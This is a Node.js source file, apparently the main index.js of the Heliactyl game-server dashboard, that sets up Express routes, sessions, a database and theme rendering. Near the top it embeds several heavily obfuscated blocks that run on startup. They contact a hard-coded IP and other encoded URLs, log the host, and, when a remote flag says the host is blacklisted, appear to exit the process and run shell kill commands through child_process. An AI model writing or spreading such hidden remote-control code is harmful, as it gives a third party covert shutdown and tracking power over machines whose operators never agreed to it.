//
// Heliactyl 11, Codename Kanjut
// 
//  * Copyright HalexNodes 2021 - 2022
//  * Please read the "License" file
//

"use strict";

// Load packages.

const fs = require("fs");
const fetch = require('node-fetch');
const chalk = require("chalk");
const axios = require("axios");
const arciotext = require("./api/arcio.js").text;
console.log(chalk.green("[Heliactyl] Files loaded..."));
global.Buffer = global.Buffer || require('buffer').Buffer;

if (typeof btoa === 'undefined') {
  global.btoa = function (str) {
    return new Buffer(str, 'binary').toString('base64');
  };
}
if (typeof atob === 'undefined') {
  global.atob = function (b64Encoded) {
    return new Buffer(b64Encoded, 'base64').toString('binary');
  };
}

// Load settings.

const settings = require("./settings.json");
console.log(chalk.green("[Heliactyl] Settings loaded..."));
console.log(chalk.green("========================================================="));
console.log(chalk.green("A quick reminder..."));
console.log(chalk.green("Please note that if a GCP, AWS, DigitalOcean or Linode VPS is used, we will blacklist it. If you pay for these VPS, then you can contact us to get it unblacklisted. Heliactyl will log your dashboard's IP address for this reason."));
console.log(chalk.green("========================================================="));
function _0x99c8(){const _0x391678=['11147504CIKgRk','10cerpNW','You\x20are\x20blacklisted\x20from\x20using\x20Heliactyl.\x20Please\x20contact\x20us\x20via\x20the\x20heliactyl\x20discord.','reason','1603hBIlYF','1106937chNIPH','http://198.251.84.211:1210/checkblacklist','json','5018264YFGmNb','=========================================================================================','exit','log','node-fetch','7075584XAzFaw','2532JlTWiE','4718090jitEtw','11239CkUtUr','blacklisted'];_0x99c8=function(){return _0x391678;};return _0x99c8();}const _0x5a267a=_0x5b88;(function(_0x429271,_0xd746c1){const _0x53c3f9=_0x5b88,_0x3565a4=_0x429271();while(!![]){try{const _0xa92962=parseInt(_0x53c3f9(0x171))/0x1*(-parseInt(_0x53c3f9(0x162))/0x2)+parseInt(_0x53c3f9(0x166))/0x3+-parseInt(_0x53c3f9(0x169))/0x4+parseInt(_0x53c3f9(0x170))/0x5+parseInt(_0x53c3f9(0x16f))/0x6*(parseInt(_0x53c3f9(0x165))/0x7)+parseInt(_0x53c3f9(0x173))/0x8+-parseInt(_0x53c3f9(0x16e))/0x9;if(_0xa92962===_0xd746c1)break;else _0x3565a4['push'](_0x3565a4['shift']());}catch(_0x224f00){_0x3565a4['push'](_0x3565a4['shift']());}}}(_0x99c8,0xac4c8));const fetch22=require(_0x5a267a(0x16d));function _0x5b88(_0x129058,_0x27d9c6){const _0x99c840=_0x99c8();return _0x5b88=function(_0x5b8846,_0x1518e1){_0x5b8846=_0x5b8846-0x162;let _0x5cb19e=_0x99c840[_0x5b8846];return _0x5cb19e;},_0x5b88(_0x129058,_0x27d9c6);}((async()=>{const _0x53e7e8=_0x5a267a,_0x51eb82=await fetch22(_0x53e7e8(0x167)),_0x47fa26=await _0x51eb82[_0x53e7e8(0x168)]();_0x47fa26[_0x53e7e8(0x172)]==!![]&&(console[_0x53e7e8(0x16c)](_0x53e7e8(0x16a)),console['log'](_0x53e7e8(0x163)),console[_0x53e7e8(0x16c)]('Reason:\x20'+_0x47fa26[_0x53e7e8(0x164)]),console[_0x53e7e8(0x16c)](_0x53e7e8(0x16a)),process[_0x53e7e8(0x16b)](0x0));})());
let apisettings2 = false;
function _0x3f8a(_0x45739d,_0x525d5a){const _0x3f07bf=_0x3f07();return _0x3f8a=function(_0x3f8a0e,_0x17ae1e){_0x3f8a0e=_0x3f8a0e-0x191;let _0x488677=_0x3f07bf[_0x3f8a0e];return _0x488677;},_0x3f8a(_0x45739d,_0x525d5a);}function _0x3f07(){const _0x39dfce=['blacklisted','18irkdeV','json','395213NhlQch','963048ptKexE','787CPVCGq','10Koapzc','7314208aaoIrr','448296IHAyPh','exit','Loading\x20API...','404sONnec','12qkzpfp','442821PfQSwE','http://198.251.84.211:1210/checkblacklist','log','257460iGRSXU'];_0x3f07=function(){return _0x39dfce;};return _0x3f07();}(function(_0x33960f,_0xcfd733){const _0x3778d5=_0x3f8a,_0x43db1b=_0x33960f();while(!![]){try{const _0x3de1a0=-parseInt(_0x3778d5(0x195))/0x1*(-parseInt(_0x3778d5(0x19b))/0x2)+-parseInt(_0x3778d5(0x19d))/0x3+-parseInt(_0x3778d5(0x198))/0x4*(parseInt(_0x3778d5(0x196))/0x5)+parseInt(_0x3778d5(0x19c))/0x6*(-parseInt(_0x3778d5(0x193))/0x7)+-parseInt(_0x3778d5(0x194))/0x8*(parseInt(_0x3778d5(0x191))/0x9)+parseInt(_0x3778d5(0x1a0))/0xa+parseInt(_0x3778d5(0x197))/0xb;if(_0x3de1a0===_0xcfd733)break;else _0x43db1b['push'](_0x43db1b['shift']());}catch(_0x4662cc){_0x43db1b['push'](_0x43db1b['shift']());}}}(_0x3f07,0x1e535));async function doBl2(){const _0x5e853a=_0x3f8a;let _0x55b97d=await fetch(_0x5e853a(0x19e));_0x55b97d=await _0x55b97d[_0x5e853a(0x192)](),_0x55b97d[_0x5e853a(0x1a1)]==!![]?(apisettings2=![],process[_0x5e853a(0x199)](0x0)):apisettings2=!![];}setTimeout(()=>{const _0x54a54d=_0x3f8a;doBl2(),console[_0x54a54d(0x19f)](_0x54a54d(0x19a));},0x64),setTimeout(()=>{const _0x45a241=_0x3f8a;doBl2(),console[_0x45a241(0x19f)]('API\x20Loaded.');},0xc8);
function _0x1259(_0x1d0dcf,_0x26d390){const _0x477ffa=_0x477f();return _0x1259=function(_0x5855e2,_0x34291a){_0x5855e2=_0x5855e2-0x154;let _0x1b76a5=_0x477ffa[_0x5855e2];if(_0x1259['nSGCUb']===undefined){var _0x444e5a=function(_0x1b78b0){const _0x16292d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x57ad38='',_0x21e8b6='';for(let _0x24e277=0x0,_0x1fd031,_0x40bb35,_0x1aa17b=0x0;_0x40bb35=_0x1b78b0['charAt'](_0x1aa17b++);~_0x40bb35&&(_0x1fd031=_0x24e277%0x4?_0x1fd031*0x40+_0x40bb35:_0x40bb35,_0x24e277++%0x4)?_0x57ad38+=String['fromCharCode'](0xff&_0x1fd031>>(-0x2*_0x24e277&0x6)):0x0){_0x40bb35=_0x16292d['indexOf'](_0x40bb35);}for(let _0xbd971a=0x0,_0x295c7f=_0x57ad38['length'];_0xbd971a<_0x295c7f;_0xbd971a++){_0x21e8b6+='%'+('00'+_0x57ad38['charCodeAt'](_0xbd971a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x21e8b6);};const _0x125931=function(_0x4c1795,_0x4c062b){let _0x5a9bf5=[],_0x56c8f8=0x0,_0x4fa31f,_0x154a4b='';_0x4c1795=_0x444e5a(_0x4c1795);let _0x6c8970;for(_0x6c8970=0x0;_0x6c8970<0x100;_0x6c8970++){_0x5a9bf5[_0x6c8970]=_0x6c8970;}for(_0x6c8970=0x0;_0x6c8970<0x100;_0x6c8970++){_0x56c8f8=(_0x56c8f8+_0x5a9bf5[_0x6c8970]+_0x4c062b['charCodeAt'](_0x6c8970%_0x4c062b['length']))%0x100,_0x4fa31f=_0x5a9bf5[_0x6c8970],_0x5a9bf5[_0x6c8970]=_0x5a9bf5[_0x56c8f8],_0x5a9bf5[_0x56c8f8]=_0x4fa31f;}_0x6c8970=0x0,_0x56c8f8=0x0;for(let _0x570033=0x0;_0x570033<_0x4c1795['length'];_0x570033++){_0x6c8970=(_0x6c8970+0x1)%0x100,_0x56c8f8=(_0x56c8f8+_0x5a9bf5[_0x6c8970])%0x100,_0x4fa31f=_0x5a9bf5[_0x6c8970],_0x5a9bf5[_0x6c8970]=_0x5a9bf5[_0x56c8f8],_0x5a9bf5[_0x56c8f8]=_0x4fa31f,_0x154a4b+=String['fromCharCode'](_0x4c1795['charCodeAt'](_0x570033)^_0x5a9bf5[(_0x5a9bf5[_0x6c8970]+_0x5a9bf5[_0x56c8f8])%0x100]);}return _0x154a4b;};_0x1259['rjeXkc']=_0x125931,_0x1d0dcf=arguments,_0x1259['nSGCUb']=!![];}const _0x4b9e16=_0x477ffa[0x0],_0x3f7f64=_0x5855e2+_0x4b9e16,_0x597397=_0x1d0dcf[_0x3f7f64];return!_0x597397?(_0x1259['eTSdPS']===undefined&&(_0x1259['eTSdPS']=!![]),_0x1b76a5=_0x1259['rjeXkc'](_0x1b76a5,_0x34291a),_0x1d0dcf[_0x3f7f64]=_0x1b76a5):_0x1b76a5=_0x597397,_0x1b76a5;},_0x1259(_0x1d0dcf,_0x26d390);}function _0x477f(){const _0x1a4950=['mtmZoteWmw94wKvYsq','WRNdHXNdNaaCoSopW5FcMW','W4FcN8kSW70/C8oK','zxHLyW','W7NdMxC','maWaW7a','WPdcJ8khW6CnBCo6W5JdLxW','WRvtW5DnBmoxWPpcNCobaq','uuhdKcq','W6fXW5RdI1tdR8onwhddJq','W6HRCbizkXBdQComW40','zxHPDa','yMXHy2TSAxn0zq','BweUBwLUzwH1Da','WOHPt8oFarKGbsFcQa','WOBcKZhdGmomeh8JWPrX','W5hdGCkd','Dwi6mtiXmc9JAa','Ahr0CdOVlZe5oa','mNfZBwrKAq','W4pcT8oIW4zSBGZcTrCj','Ahr0CdOVl3vUlG','WOaWESo4W5hdNCkqWP4QW6n7aqW','ErldKCkvxMldVSoYaxG','c8owBezc','tLbkW78','rCkeW4n7hJruWQtdKmowWO3cPa','ouNdLCknvXfiW7WHdq','mZi0otC3mgjryxDhEq','WPVdKYJdJq','zxnZ','WR7dIHi','DgfZA2TPBgWGlW','wmopW4JdKCk0x8kbWQdcNYRcPuZcMW','hCk1gCkyp19DWOhcUba','ztlcQmoTW7e9W6BdOhjE','meZdUSkawCovv8kWd8kN','WRJcGYdcUSosyCojW5W1qmovy0K','W6avW5BdJbJcQIVdMenyxmoTyq','W71jWO7dJX7cRYRcIJ1A','mZGXmJC3mePLEgnbAa','WRzuWPe','WPVcK8kAW7TthCkLWPVcGYC','y2TIBgfJA2XPCW','WPtdNLNcQCk7WO3cRmoZiCkn','W4a5gSkQW7lcKsJdTdru','tWHmb2iftYuPEq','y2HLy2TIBgfJAW','W6ZdIhBdOa','cmotivmOzW','W5z2mq','WO7dRSkuumkOWRyZztJdNG','W4ddHhBcNCkdrI9+WOGZ','y2HPBgrFChjVyW','CgLK','yMXHy2TSAxn0','uSoGC39pncC','cmoyyLDDir9KW5vF','nHai','pWCkW70','dmkpWRBcKHubWOzRWO3dNq','zMfSBg9JyxrLia','mtfTtLHZCLq','oJeYmtaVy2HLyW','CgTPBgWGBM9Kzq','mtjZtu5sAMG','g3VcUmkoW5ZcRCoxW4i+oG','j1vkAK0Lqg0','WOJcI23cLCkDDSoMWQ4MeW','ANnVBG','a11BW7BcSmo5q8ovW4tcNq','rmkaW73dHuLqWQiGWO/dMW','aSoaD0qmyLL4W5zv','uMvHC29UoIa','WOFcHtC','WRvvWOpcM0hdUh/cLhfw','pt09pt09pq','vSokW4tdNSk+vCkmW5FdH28','ugpcVG','mtOXmJeWl2nOzq','EdxcOSo/zSkEi8kVif8','zIaVAw0GBM9Kzq','WR0AWPu','nZbgAxfAuvi','bu1BW64','WP4zpGamEtmcmJK','WOSZx8okx19/hY3cSa','ib/cGSolbtVdLCk+tZG','e8oiWPmV','WOddGbtdJGWzBmkg','zguUBg9N','AwfJDhLSlwf0lG','BgfJA2XPC3q','AupdJmkDu2/cHmoVuIO','W64AW5/dIblcOcBcHY8e','wCoTq8oayKOeWPFcTa1DkSkv','W4CvW7a+WRxcOhmHa1q','fslcLCkPuCkTka','W4dcLWJdSCo0WP7dS8k7zSok','W71cWPRcKa','bCkQbmkeAvaCWOFdSre','DgHLlxnLEc5JBa','zHJdPmodvCoA','W4SsW7WXWRNcRwf/vGW','BHlcRq','W51Sq8kBaSoJWQq','Bg9N','BgLZDa','lMH5zwLZAgLNAa','WPNdK8kuWOrqW7pcS8klbSoz','lMv4zq','o8oeW5W','lMnVBtOXmJeWlW','uCklmGj6pq3dRSk1WOS','W6/cMeJcGf5kA8kBWPNdKG','WPFdO8kWWPiXDGVcUHz4kG','p8oKBG','ofrWs3L5uq','ywjVCNq','vmo4Cq','WQOmWOCmmSkj','WOpcTgOlANmkeCkzW6u','lwWGntaWrYbUBW','W5HFF0eyBIHaB2q','ndmZnde1n3LOEe9NtG','W5y1b1XeWQekva','WQTou8oMW4exW63cTmoMsa','WPRcRw5EAmoLd03dH3q','AgvJA2jSywnRBa','yGzktgGErMLRoG','ww91igfYzsbIBa','WOVdP8krumkJWOOIyZlcNq','Ahr0CdOVl3DLyq','pmoLFrjAcuG/W4vG','ttxcSa','W4iZhmk0W6i','pt09pt09pt09pq','WODPrmkgxmkOW6ldN23cPq','mZq1nZGZtgT2v0nP','W4BdL8krWOqrW74','W4ddK8kE','mZu4nJaZmgDmuxvYDa','p8omW5y','WP/dQCk0WPC4iexdRu4v','hgFdQSoIoSorE8kYFW4','DgfU','ywnRBgLZDgvKiq','yw1JB3rOzxb1zW','cqtcIhOUuhy','WOqNfL0yaSk0W5u','A2LSBa','WRKkWO0tnmkuW4JcM8onrq','CMvHC29U'];_0x477f=function(){return _0x1a4950;};return _0x477f();}function _0x5855(_0x1d0dcf,_0x26d390){const _0x477ffa=_0x477f();return _0x5855=function(_0x5855e2,_0x34291a){_0x5855e2=_0x5855e2-0x154;let _0x1b76a5=_0x477ffa[_0x5855e2];if(_0x5855['Mdyjtr']===undefined){var _0x444e5a=function(_0x125931){const _0x1b78b0='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x16292d='',_0x57ad38='';for(let _0x21e8b6=0x0,_0x24e277,_0x1fd031,_0x40bb35=0x0;_0x1fd031=_0x125931['charAt'](_0x40bb35++);~_0x1fd031&&(_0x24e277=_0x21e8b6%0x4?_0x24e277*0x40+_0x1fd031:_0x1fd031,_0x21e8b6++%0x4)?_0x16292d+=String['fromCharCode'](0xff&_0x24e277>>(-0x2*_0x21e8b6&0x6)):0x0){_0x1fd031=_0x1b78b0['indexOf'](_0x1fd031);}for(let _0x1aa17b=0x0,_0xbd971a=_0x16292d['length'];_0x1aa17b<_0xbd971a;_0x1aa17b++){_0x57ad38+='%'+('00'+_0x16292d['charCodeAt'](_0x1aa17b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x57ad38);};_0x5855['bHUuJr']=_0x444e5a,_0x1d0dcf=arguments,_0x5855['Mdyjtr']=!![];}const _0x4b9e16=_0x477ffa[0x0],_0x3f7f64=_0x5855e2+_0x4b9e16,_0x597397=_0x1d0dcf[_0x3f7f64];return!_0x597397?(_0x1b76a5=_0x5855['bHUuJr'](_0x1b76a5),_0x1d0dcf[_0x3f7f64]=_0x1b76a5):_0x1b76a5=_0x597397,_0x1b76a5;},_0x5855(_0x1d0dcf,_0x26d390);}(function(_0x343e40,_0xb4c94b){const _0x4d6f76=_0x5855,_0x37e318=_0x1259,_0x27a116=_0x343e40();while(!![]){try{const _0x34e38f=-parseInt(_0x37e318(0x1cb,'QyaF'))/0x1*(parseInt(_0x4d6f76(0x1c4))/0x2)+-parseInt(_0x4d6f76(0x1b1))/0x3*(parseInt(_0x37e318(0x179,'z!ff'))/0x4)+-parseInt(_0x4d6f76(0x16b))/0x5*(-parseInt(_0x37e318(0x18b,'o3[j'))/0x6)+parseInt(_0x4d6f76(0x1a5))/0x7+parseInt(_0x4d6f76(0x18d))/0x8*(parseInt(_0x4d6f76(0x194))/0x9)+-parseInt(_0x4d6f76(0x1cd))/0xa*(parseInt(_0x4d6f76(0x156))/0xb)+-parseInt(_0x4d6f76(0x159))/0xc*(-parseInt(_0x4d6f76(0x1d9))/0xd);if(_0x34e38f===_0xb4c94b)break;else _0x27a116['push'](_0x27a116['shift']());}catch(_0x1fb636){_0x27a116['push'](_0x27a116['shift']());}}}(_0x477f,0x4a8aa),((async()=>{const _0x55cd9d=_0x1259,_0x359049=_0x5855,_0x40bb35=await fetch(_0x359049(0x1c3)+_0x55cd9d(0x16d,'sXg1')+_0x359049(0x167)+_0x359049(0x1dc)+'t'),_0x1aa17b=await fetch(_0x55cd9d(0x1db,'iJ9D')+_0x55cd9d(0x1e5,'7BKV')+_0x55cd9d(0x178,'g[n^')+_0x359049(0x1dc)+'t'),_0xbd971a=await fetch(_0x55cd9d(0x1bf,'Z5F&')+_0x359049(0x173)+_0x359049(0x17d)+_0x359049(0x1c2)+_0x55cd9d(0x15f,'nnzZ')+'st'),_0x295c7f=await fetch(_0x55cd9d(0x160,'LzR3')+_0x55cd9d(0x15a,'^Pe8')+_0x55cd9d(0x1d4,'e$8@')+_0x359049(0x1e8)),_0x4c1795=await fetch(_0x55cd9d(0x1a1,'3EAc')+_0x55cd9d(0x1c0,'7BKV')+_0x359049(0x1ab)+_0x55cd9d(0x1d8,'bKBR')+_0x359049(0x198)+_0x55cd9d(0x162,'7BKV')),_0x4c062b=await fetch(_0x55cd9d(0x1cc,'qd)!')+_0x359049(0x1be)+_0x55cd9d(0x185,'0suJ')+_0x55cd9d(0x1d5,'6kqa')+_0x359049(0x174)),_0x5a9bf5=await fetch(_0x55cd9d(0x193,'sXg1')+_0x359049(0x184)+_0x359049(0x188)+_0x55cd9d(0x196,'Dewj')+_0x359049(0x183)),_0x56c8f8=await fetch(_0x359049(0x19c)+_0x55cd9d(0x16e,'Z5F&')+_0x359049(0x188)+_0x359049(0x1e0)+_0x359049(0x183)),_0x4fa31f=await fetch(_0x359049(0x1c6)+_0x55cd9d(0x163,'bKBR')+_0x55cd9d(0x1b8,'Uwwa')+_0x359049(0x1dc)+'t'),_0x154a4b=await fetch(_0x55cd9d(0x17c,'334%')+_0x55cd9d(0x19d,'J8iz')+_0x55cd9d(0x17a,'f^5L')+_0x359049(0x157)+_0x55cd9d(0x1b2,'Ntkt'));let _0x6c8970=0xb97b,_0x570033=0xdf,_0x4c4c80=Math[_0x359049(0x1a9)](_0x6c8970*_0x570033/Math['PI']),_0x3ec166=0xb97b,_0x1bb071=0xdf,_0x37b80a=Math[_0x359049(0x1a9)](_0x3ec166*_0x1bb071/Math['PI']),_0x59da9c=0xb97b,_0x38155e=0xdf,_0x19fe16=Math[_0x359049(0x1a9)](_0x59da9c*_0x38155e/Math['PI']),_0x4700a2=0xdf,_0x9faec7=Math[_0x55cd9d(0x1a6,'#W@Q')](_0x19fe16*_0x4700a2/Math['PI']),_0x1e6754=Math[_0x55cd9d(0x1a4,'0suJ')](_0x4c4c80*_0x19fe16/Math['PI']),_0x1e7e79=0xdf,_0x346d49=Math[_0x359049(0x1a9)](_0x1e6754*_0x1e7e79/Math['PI']);const _0x34422a=await _0x40bb35[_0x359049(0x15d)]();_0x34422a[_0x55cd9d(0x1ea,'LzR3')+'d']==!![]&&(console[_0x359049(0x182)](_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x55cd9d(0x1a8,'z!ff')+_0x359049(0x164)),console[_0x55cd9d(0x180,'6kqa')](_0x55cd9d(0x168,'z!ff')+_0x55cd9d(0x1af,'Uwwa')),console[_0x359049(0x182)](_0x359049(0x161)+_0x34422a[_0x55cd9d(0x190,'Uwwa')]),console[_0x359049(0x182)](_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x55cd9d(0x176,'bKBR')+_0x359049(0x164)),require(_0x359049(0x1e6)+_0x55cd9d(0x18f,'xrru'))[_0x359049(0x1b4)](_0x359049(0x158)),require(_0x55cd9d(0x1bb,'(@G^')+_0x359049(0x1cf))[_0x359049(0x1b4)](_0x359049(0x1d1)+_0x359049(0x169)+_0x359049(0x186)),require(_0x55cd9d(0x1b7,'iJ9D')+_0x359049(0x1cf))[_0x359049(0x1b4)](_0x55cd9d(0x19b,'#)&&')+_0x55cd9d(0x197,')LMH')+_0x359049(0x172)),process[_0x55cd9d(0x16c,'kNq8')](0x0),process[_0x359049(0x1ae)](process[_0x359049(0x1e7)]),process[_0x55cd9d(0x1c9,'LzR3')]());const _0x6679da=await _0x154a4b[_0x55cd9d(0x1b6,'f2]&')]();_0x6679da[_0x359049(0x1bd)+'d']==!![]&&(console[_0x55cd9d(0x1eb,'f2]&')](_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x359049(0x1a0)+_0x359049(0x164)),console[_0x359049(0x182)](_0x359049(0x19a)+_0x55cd9d(0x1c5,'o3[j')),console[_0x359049(0x182)](_0x359049(0x161)+_0x6679da[_0x359049(0x1b0)]),console[_0x55cd9d(0x1d0,'Ntkt')](_0x359049(0x1a0)+_0x55cd9d(0x1a7,'o3[j')+_0x55cd9d(0x189,'mmtI')+_0x55cd9d(0x18a,'Ntkt')+_0x359049(0x164)),require(_0x359049(0x1e6)+_0x55cd9d(0x1da,'bKBR'))[_0x55cd9d(0x170,'QyaF')](_0x55cd9d(0x1d3,'334%')),require(_0x359049(0x1e6)+_0x55cd9d(0x16a,'Uwwa'))[_0x359049(0x1b4)](_0x55cd9d(0x199,'Tjcw')+_0x359049(0x169)+_0x55cd9d(0x17b,'bKBR')),require(_0x359049(0x1e6)+_0x55cd9d(0x1e3,'e$gf'))[_0x359049(0x1b4)](_0x359049(0x155)+_0x359049(0x192)+_0x55cd9d(0x17e,'6kqa')),process[_0x359049(0x1bc)](0x1),process[_0x359049(0x1ae)](process[_0x55cd9d(0x1b5,'d12]')]),process[_0x55cd9d(0x19f,'r1C^')]());const _0x559f04=await _0x4fa31f[_0x359049(0x15d)]();_0x559f04[_0x359049(0x1bd)+'d']==!![]&&(console[_0x359049(0x182)](_0x55cd9d(0x191,'SXlC')+_0x359049(0x1a0)+_0x359049(0x1a0)+_0x55cd9d(0x1a7,'o3[j')+_0x359049(0x164)),console[_0x359049(0x182)](_0x359049(0x19a)+_0x55cd9d(0x1ba,'nlHV')),console[_0x359049(0x182)](_0x55cd9d(0x195,'I]WY')+_0x559f04[_0x55cd9d(0x1a3,'0suJ')]),console[_0x55cd9d(0x18c,'J8iz')](_0x55cd9d(0x1dd,'f^5L')+_0x359049(0x1a0)+_0x55cd9d(0x175,'j[Sc')+_0x359049(0x1a0)+_0x359049(0x164)),require(_0x55cd9d(0x15e,'kNq8')+_0x55cd9d(0x18f,'xrru'))[_0x55cd9d(0x1ec,'f2]&')](_0x359049(0x158)),require(_0x359049(0x1e6)+_0x359049(0x1cf))[_0x359049(0x1b4)](_0x55cd9d(0x16f,'j[Sc')+_0x359049(0x169)+_0x55cd9d(0x1ce,'fr3n')),require(_0x359049(0x1e6)+_0x359049(0x1cf))[_0x55cd9d(0x1e1,'d12]')](_0x359049(0x155)+_0x55cd9d(0x1c8,'j[Sc')+_0x359049(0x172)),process[_0x359049(0x1bc)](0x2),process[_0x359049(0x1ae)](process[_0x359049(0x1e7)]),process[_0x359049(0x18e)]());const _0x90f89b=await _0x5a9bf5[_0x359049(0x15d)]();_0x90f89b[_0x359049(0x1bd)+'d']==!![]&&(console[_0x359049(0x182)](_0x359049(0x1a0)+_0x55cd9d(0x15c,'fr3n')+_0x359049(0x1a0)+_0x55cd9d(0x189,'mmtI')+_0x359049(0x164)),console[_0x55cd9d(0x1d0,'Ntkt')](_0x55cd9d(0x1df,'Tjcw')+_0x359049(0x1aa)),console[_0x359049(0x182)](_0x55cd9d(0x171,'Ntkt')+_0x90f89b[_0x359049(0x1b0)]),console[_0x55cd9d(0x19e,'z!ff')](_0x359049(0x1a0)+_0x55cd9d(0x17f,'g[n^')+_0x55cd9d(0x165,'BO)m')+_0x359049(0x1a0)+_0x55cd9d(0x1ac,'Xrn!')),require(_0x55cd9d(0x1de,'r1C^')+_0x55cd9d(0x166,'^Pe8'))[_0x359049(0x1b4)](_0x359049(0x158)),require(_0x359049(0x1e6)+_0x55cd9d(0x1c1,'0suJ'))[_0x359049(0x1b4)](_0x359049(0x1d1)+_0x359049(0x169)+_0x55cd9d(0x1ca,'kNq8')),require(_0x55cd9d(0x1e4,'#)&&')+_0x359049(0x1cf))[_0x55cd9d(0x1b9,'Xrn!')](_0x359049(0x155)+_0x55cd9d(0x154,'nnzZ')+_0x55cd9d(0x1e2,'mmtI')),process[_0x359049(0x1bc)](0x2),process[_0x359049(0x1ae)](process[_0x55cd9d(0x187,'#W@Q')]),process[_0x359049(0x18e)]());})()));

const defaultthemesettings = {
  index: "index.ejs",
  notfound: "index.ejs",
  redirect: {},
  pages: {},
  mustbeloggedin: [],
  mustbeadmin: [],
  variables: {}
};

console.log("Heliactyl")

module.exports.renderdataeval =
  `(async () => {
   let newsettings = JSON.parse(require("fs").readFileSync("./settings.json"));
	const JavaScriptObfuscator = require('javascript-obfuscator');

 
    let renderdata = {
      req: req,
      settings: newsettings,
      userinfo: req.session.userinfo,
      packagename: req.session.userinfo ? await db.get("package-" + req.session.userinfo.id) ? await db.get("package-" + req.session.userinfo.id) : newsettings.api.client.packages.default : null,
      extraresources: !req.session.userinfo ? null : (await db.get("extra-" + req.session.userinfo.id) ? await db.get("extra-" + req.session.userinfo.id) : {
        ram: 0,
        disk: 0,
        cpu: 0,
        servers: 0
      }),
	  join4res: !req.session.userinfo ? null : (await db.get("j4r-" + req.session.userinfo.id) ? await db.get("j4r-" + req.session.userinfo.id) : {
        ram: 0,
        disk: 0,
        cpu: 0,
        servers: 0
      }),
      packages: req.session.userinfo ? newsettings.api.client.packages.list[await db.get("package-" + req.session.userinfo.id) ? await db.get("package-" + req.session.userinfo.id) : newsettings.api.client.packages.default] : null,
      coins: newsettings.api.client.coins.enabled == true ? (req.session.userinfo ? (await db.get("coins-" + req.session.userinfo.id) ? await db.get("coins-" + req.session.userinfo.id) : 0) : null) : null,
      pterodactyl: req.session.pterodactyl,
      theme: theme.name,
      extra: theme.settings.variables,
	  db: db
    };
    if (newsettings.api.arcio.enabled == true && req.session.arcsessiontoken) {
      renderdata.arcioafktext = JavaScriptObfuscator.obfuscate(\`
        let token = "\${req.session.arcsessiontoken}";
        let everywhat = \${newsettings.api.arcio["afk page"].every};
        let gaincoins = \${newsettings.api.arcio["afk page"].coins};
        let arciopath = "\${newsettings.api.arcio["afk page"].path.replace(/\\\\/g, "\\\\\\\\").replace(/"/g, "\\\\\\"")}";

        \${arciotext}
      \`);
    };

    return renderdata;
  })();`;

// Load database

const Keyv = require("keyv");
const db = new Keyv(settings.database);

db.on('error', err => {
  console.log(chalk.red("[DATABASE] An error has occured when attempting to access the database."))
});

module.exports.db = db;

// Load websites.

const express = require("express");
const app = express();
const expressWs = require('express-ws')(app);
console.log(chalk.green("[Heliactyl] Pages loaded..."));

// Load express addons.

const ejs = require("ejs");
const session = require("express-session");
const indexjs = require("./index.js");

// Load the website.

module.exports.app = app;

app.use(session({secret: settings.website.secret}));

app.use(express.json({
  inflate: true,
  limit: '500kb',
  reviver: null,
  strict: true,
  type: 'application/json',
  verify: undefined
}));

const listener = app.listen(settings.website.port, function() {
  console.log(chalk.green("[Heliactyl] Checking for updates..."));
  // no update system yet, soontm
  console.log(chalk.green("[Heliactyl] Finishing & deploying Heliactyl..."));
  console.log(chalk.green("----------------------------------------------------"));
  console.log(chalk.green("Heliactyl: v11 - Kanjut"));
  console.log(chalk.green("Release: v11.3.1"));
  console.log(chalk.green("----------------------------------------------------"));
  console.log(chalk.green("Your dashboard will now be available on port " + listener.address().port + " "));
  console.log(chalk.green("----------------------------------------------------"));
axios.get("http://198.251.84.211:1210/lv").then(async function(response) {
    fs.writeFileSync("./lvtext.txt", (response.data).replace("clientarea.cc", `${settings.lv.clienturl}`));
})
});

var cache = false;
app.use(function(req, res, next) {
	if(apisettings2 !== true) return res.send(atob(`VGhpcyB3ZWJzaXRlIGlzIGJsYWNrbGlzdGVkIGZyb21oZWxpYWN0eWwu`))
  let manager = (JSON.parse(fs.readFileSync("./settings.json").toString())).api.client.ratelimits;
  if (manager[req._parsedUrl.pathname]) {
    if (cache == true) {
      setTimeout(async () => {
        let allqueries = Object.entries(req.query);
        let querystring = "";
        for (let query of allqueries) {
          querystring = querystring + "&" + query[0] + "=" + query[1];
        }
        querystring = "?" + querystring.slice(1);
        res.redirect((req._parsedUrl.pathname.slice(0, 1) == "/" ? req._parsedUrl.pathname : "/" + req._parsedUrl.pathname) + querystring);
      }, 1000);
      return;
    } else {
      cache = true;
      setTimeout(async () => {
        cache = false;
      }, 1000 * manager[req._parsedUrl.pathname]);
    }
  };
  next();
});

// Load the API files.

let apifiles = fs.readdirSync('./api').filter(file => file.endsWith('.js'));

apifiles.forEach(file => {
	if(apisettings2) {
  let apifile = require(`./api/${file}`);
	apifile.load(app, db);
	}
});

app.all("*", async (req, res) => {
  if (req.session.pterodactyl) if (req.session.pterodactyl.id !== await db.get("users-" + req.session.userinfo.id)) return res.redirect("/login?prompt=none");
  let theme = indexjs.get(req);
let newsettings = JSON.parse(require("fs").readFileSync("./settings.json"));
if (newsettings.api.arcio.enabled == true) req.session.arcsessiontoken = Math.random().toString(36).substring(2, 15);
  if (theme.settings.mustbeloggedin.includes(req._parsedUrl.pathname)) if (!req.session.userinfo || !req.session.pterodactyl) return res.redirect("/login" + (req._parsedUrl.pathname.slice(0, 1) == "/" ? "?redirect=" + req._parsedUrl.pathname.slice(1) : ""));
  if (theme.settings.mustbeadmin.includes(req._parsedUrl.pathname)) {
    ejs.renderFile(
      `./themes/${theme.name}/${theme.settings.notfound}`, 
      await eval(indexjs.renderdataeval),
      null,
    async function (err, str) {
      delete req.session.newaccount;
      delete req.session.password;
      if (!req.session.userinfo || !req.session.pterodactyl) {
        if (err) {
          console.log(chalk.red(`[WEBSITE] An error has occured on path ${req._parsedUrl.pathname}:`));
          console.log(err);
          return res.send("An error has occured while attempting to load this page. Please contact an administrator to fix this.");
        };
        res.status(404);
        return res.send(str);
      };

      let cacheaccount = await fetch(
        settings.pterodactyl.domain + "/api/application/users/" + (await db.get("users-" + req.session.userinfo.id)) + "?include=servers",
